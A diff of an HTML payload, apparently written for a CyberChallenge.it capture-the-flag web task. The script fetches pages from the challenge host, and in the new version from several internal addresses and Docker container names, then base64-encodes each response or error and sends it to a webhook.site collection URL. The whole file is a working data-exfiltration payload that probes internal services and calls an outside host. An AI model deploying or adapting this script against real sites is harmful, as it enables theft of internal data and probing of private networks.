@@ -1,7 +1,19 @@
 <!DOCTYPE html>
-<html><body><script>
-    fetch("http://jpasta.challs.cyberchallenge.it/list")
+<script>
+const urls = [
+    "http://127.0.0.1/list",
+    "http://127.0.0.1:3000/list",
+    "http://127.0.0.1:8080/list",
+    "http://0.0.0.0/list",
+    "http://app/list",          // nome container Docker
+    "http://web/list",          // nome container Docker
+    "http://backend/list",
+];
+
+urls.forEach(url => {
+    fetch(url)
         .then(r => r.text())
-        .then(html => fetch("https://webhook.site/df38ec50-07e5-461a-9968-23412015e697?data=" + btoa(unescape(encodeURIComponent(html)))))
-        .catch(e => fetch("https://webhook.site/df38ec50-07e5-461a-9968-23412015e697?err=" + btoa(e.toString())))
-</script></body></html>
+        .then(html => fetch("https://webhook.site/df38ec50-07e5-461a-9968-23412015e697?url=" + btoa(url) + "&data=" + btoa(unescape(encodeURIComponent(html)))))
+        .catch(e => fetch("https://webhook.site/df38ec50-07e5-461a-9968-23412015e697?url=" + btoa(url) + "&err=" + btoa(e.toString())))
+});
+</script>
